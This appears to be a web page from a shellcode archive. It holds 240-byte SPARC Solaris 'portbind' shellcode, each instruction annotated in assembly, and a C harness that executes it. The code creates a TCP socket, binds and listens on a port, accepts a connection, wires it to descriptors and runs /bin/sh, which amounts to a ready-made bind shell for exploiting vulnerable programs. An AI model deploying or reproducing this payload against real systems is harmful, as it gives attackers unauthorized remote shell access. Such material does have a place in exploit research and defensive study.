<html><head><title>Solaris/sparc - portbind | port 6666 - 240 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * lhall@telegenetic.net
 * portbind shellcode
 * full description of how it was done and defines at
 * http://www.telegenetic.net/sparc-shellcode.htm
 */


char shellcode[]=
&quot;\x9A\x1A\x40\x09&quot; /* xor %o1, %o1, %o5          */
&quot;\x90\x10\x20\x02&quot; /* mov PF_INET, %o0           */
&quot;\x92\x10\x20\x02&quot; /* mov SOCK_STREAM, %o1       */
&quot;\x94\x10\x20\x06&quot; /* mov IPPROTO_TCP, %o2       */
&quot;\x96\x1A\x40\x09&quot; /* xor %o1, %o1, %o3          */
&quot;\x98\x22\x20\x01&quot; /* sub %o0, 1, %o4            */
&quot;\x82\x10\x20\xE6&quot; /* mov SYS_SOCKET, %g1        */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\xA0\x1B\x40\x08&quot; /* xor %o5, %o0, %l0          */
&quot;\xC0\x23\xBF\xF4&quot; /* st  %g0, [%sp - 0xc]       */
&quot;\xA2\x10\x2D\x05&quot; /* mov 3333, %l1              */
&quot;\xE2\x33\xBF\xF2&quot; /* sth %l1, [%sp - 0xe]       */
&quot;\xA2\x10\x20\x02&quot; /* mov AF_INET, %l1           */
&quot;\xE2\x33\xBF\xF0&quot; /* sth %l1, [%sp - 0x10]      */
&quot;\x92\x23\xA0\x10&quot; /* sub %sp, 0x10, %o1         */
&quot;\x94\x10\x20\x10&quot; /* mov SOCKADDR_IN_SIZE, %o2  */
&quot;\x82\x10\x20\xE8&quot; /* mov SYS_BIND, %g1          */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\x90\x1B\x40\x10&quot; /* xor %o5, %l0, %o0          */
&quot;\x92\x1B\x40\x0C&quot; /* xor %o5, %o4, %o1          */
&quot;\x94\x1B\x40\x0C&quot; /* xor %o5, %o4, %o2          */
&quot;\x82\x10\x20\xE9&quot; /* mov SYS_LISTEN, %g1        */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\xA2\x10\x20\x10&quot; /* mov SOCKADDR_IN_SIZE, %l1  */
&quot;\xE2\x23\xBF\xDC&quot; /* st %l1, [%sp - 0x24]       */
&quot;\x90\x1B\x40\x10&quot; /* xor %o5, %l0, %o0          */
&quot;\x92\x23\xA0\x20&quot; /* sub %sp, 0x20, %o1         */
&quot;\x94\x23\xA0\x24&quot; /* sub %sp, 0x24, %o2         */
&quot;\x96\x1B\x40\x0C&quot; /* xor %o5, %o4, %o3          */
&quot;\x82\x10\x20\xEA&quot; /* mov SYS_ACCEPT, %g1        */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\xA4\x1B\x40\x08&quot; /* xor %o5, %o0, %l2          */
&quot;\x90\x1B\x40\x0C&quot; /* xor %o5, %o4, %o0          */
&quot;\x82\x10\x20\x06&quot; /* mov SYS_CLOSE, %g1         */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\x94\x1B\x40\x0C&quot; /* xor %o5, %o4, %o2          */
&quot;\x94\x02\x80\x0A&quot; /* add %o2, %o2, %o2          */
&quot;\x90\x1B\x40\x0A&quot; /* xor %o5, %o2, %o0          */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\x92\x1A\x40\x09&quot; /* xor %o1, %o1, %o1          */
&quot;\x90\x1B\x40\x12&quot; /* xor %o5, %l2, %o0          */
&quot;\x82\x10\x20\x3E&quot; /* mov SYS_FCNTL, %g1         */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\x90\x1B\x40\x12&quot; /* xor %o5, %l2, %o0          */
&quot;\x94\x1A\x40\x09&quot; /* xor %o1, %o1, %o2          */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\x94\x1B\x40\x0C&quot; /* xor %o5, %o4, %o2          */
&quot;\x90\x1B\x40\x12&quot; /* xor %o5, %l2, %o0          */
&quot;\x91\xD0\x20\x08&quot; /* ta KERNEL                  */
&quot;\x21\x0B\xD8\x9A&quot; /* sethi %hi(0x2f626900), %l0 */
&quot;\xA0\x14\x21\x6E&quot; /* or %l0, %lo(0x16e), %l0    */
&quot;\x23\x0B\xDC\xDA&quot; /* sethi %hi(0x2f736800), %l1 */
&quot;\xE0\x3B\xBF\xF0&quot; /* std %l0, [%sp - 0x10]      */
&quot;\x90\x23\xA0\x10&quot; /* sub %sp, 0x10, %o0         */
&quot;\xD0\x23\xBF\xF8&quot; /* st  %o0, [%sp - 0x8]       */
&quot;\x92\x23\xA0\x08&quot; /* sub %sp, 0x8, %o1          */
&quot;\x94\x1A\x80\x0A&quot; /* xor %o2, %o2, %o2          */
&quot;\x82\x10\x20\x3B&quot; /* mov SYS_EXECVE, %g1        */
&quot;\x91\xD0\x20\x08&quot;; /* ta KERNEL                 */

int
main (int argc, char **argv)
{
       int (*ret)();
       ret = (int(*)())shellcode;
       (int)(*ret)();
       exit(0);
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
